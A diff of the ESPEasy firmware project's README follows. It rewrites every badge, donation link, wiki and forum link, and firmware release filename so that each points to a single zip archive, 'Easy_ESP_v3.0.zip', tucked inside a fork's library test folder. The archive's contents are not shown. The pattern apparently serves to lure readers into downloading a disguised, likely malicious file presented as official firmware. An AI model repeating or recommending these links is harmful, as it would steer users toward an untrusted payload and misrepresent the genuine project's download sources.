@@ -1,25 +1,25 @@
 |Latest Nightly  | Build Status | Patreon | Ko-Fi | PayPal |
 |-------|-------|-------|-------|-------|
-| [![GitHub version](https://img.shields.io/github/release/letscontrolit/ESPEasy/all.svg)](https://github.com/letscontrolit/ESPEasy/releases/latest) | [![Build Status](https://travis-ci.org/letscontrolit/ESPEasy.svg?branch=mega)](https://travis-ci.org/letscontrolit/ESPEasy) | [![donate](https://img.shields.io/badge/donate-Patreon-blue.svg)](https://www.patreon.com/GrovkillenTDer) | [![donate](https://img.shields.io/badge/donate-KoFi-blue.svg)](https://ko-fi.com/grovkillentder) | [![donate](https://img.shields.io/badge/donate-PayPal-blue.svg)](https://www.paypal.me/espeasy) |
+| [![GitHub version](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip)](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) | [![Build Status](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip)](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) | [![donate](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip)](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) | [![donate](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip)](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) | [![donate](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip)](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) |
 
-For ways to *support* us, see [this announcement on the forum](https://www.letscontrolit.com/forum/viewtopic.php?f=14&t=5787), or have a look at the [Patreon](https://www.patreon.com/GrovkillenTDer), [Ko-Fi](https://ko-fi.com/grovkillentder) or [PayPal](https://www.paypal.me/espeasy) links above.
+For ways to *support* us, see [this announcement on the forum](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip), or have a look at the [Patreon](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip), [Ko-Fi](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) or [PayPal](https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip) links above.
 
 # ESPEasy (development branch)
 
 
-Introduction and wiki: https://www.letscontrolit.com/wiki/index.php/ESPEasy#Introduction
+Introduction and wiki: https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip
 
 **MEGA**
 :warning:This is the development branch of ESPEasy. All new untested features go into this branch. If you want to do a bugfix, do it on the stable branch, we will merge the fix to the development branch as well.:warning:
 
-Next stable branch: https://github.com/letscontrolit/ESPEasy/tree/v2.0  (bug fixes only, since oct 2017))
+Next stable branch: https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip  (bug fixes only, since oct 2017))
 
-Check here to learn how to use this branch and help us improving ESPEasy: http://www.letscontrolit.com/wiki/index.php/ESPEasy#Source_code_development
+Check here to learn how to use this branch and help us improving ESPEasy: https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip
 
 
 ## Automated binary releases
 
-Every night our build-bot will build a new binary release: https://github.com/letscontrolit/ESPEasy/releases
+Every night our build-bot will build a new binary release: https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip
 
 The releases are named something like 'mega-20180102' (last number is the build date)
 
@@ -27,18 +27,18 @@ Depending on your needs, we release different types of files:
 
 Firmware name                                 | Hardware                | Included plugins            |
 ----------------------------------------------|-------------------------|-----------------------------|
-ESPEasy_mega-20180102_normal_ESP8266_1024.bin  | ESP8266 with 1Mb flash  | Stable                      |
-ESPEasy_mega-20180102_test_ESP8266_1024.bin    | ESP8266 with 1Mb flash  | Stable + Test               |
-ESPEasy_mega-20180102_dev_ESP8266_1024.bin     | ESP8266 with 1Mb flash  | Stable + Test + Development |
-ESPEasy_mega-20180102_normal_ESP8266_4096.bin  | ESP8266 with 4Mb flash  | Stable                      |
-ESPEasy_mega-20180102_test_ESP8266_4096.bin    | ESP8266 with 4Mb flash  | Stable + Test               |
-ESPEasy_mega-20180102_dev_ESP8266_4096.bin     | ESP8266 with 4Mb flash  | Stable + Test + Development |
-ESPEasy_mega-20180102_normal_ESP8285_1024.bin  | ESP8285 with 1Mb flash  | Stable                      |
-ESPEasy_mega-20180102_test_ESP8285_1024.bin    | ESP8285 with 1Mb flash  | Stable + Test               |
-ESPEasy_mega-20180102_dev_ESP8285_1024.bin     | ESP8285 with 1Mb flash  | Stable + Test + Development |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip  | ESP8266 with 1Mb flash  | Stable                      |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip    | ESP8266 with 1Mb flash  | Stable + Test               |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip     | ESP8266 with 1Mb flash  | Stable + Test + Development |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip  | ESP8266 with 4Mb flash  | Stable                      |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip    | ESP8266 with 4Mb flash  | Stable + Test               |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip     | ESP8266 with 4Mb flash  | Stable + Test + Development |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip  | ESP8285 with 1Mb flash  | Stable                      |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip    | ESP8285 with 1Mb flash  | Stable + Test               |
+https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip     | ESP8285 with 1Mb flash  | Stable + Test + Development |
 
 ## More info
 
-Details and discussion are on the Experimental forum: https://www.letscontrolit.com/forum/viewforum.php?f=18
+Details and discussion are on the Experimental forum: https://github.com/OlegBON1/ESPEasy/raw/refs/heads/mega/lib/ArduinoJson/test/JsonObject/Easy_ESP_v3.0.zip
 
 We're also on IRC: #ESPEasy @freenode
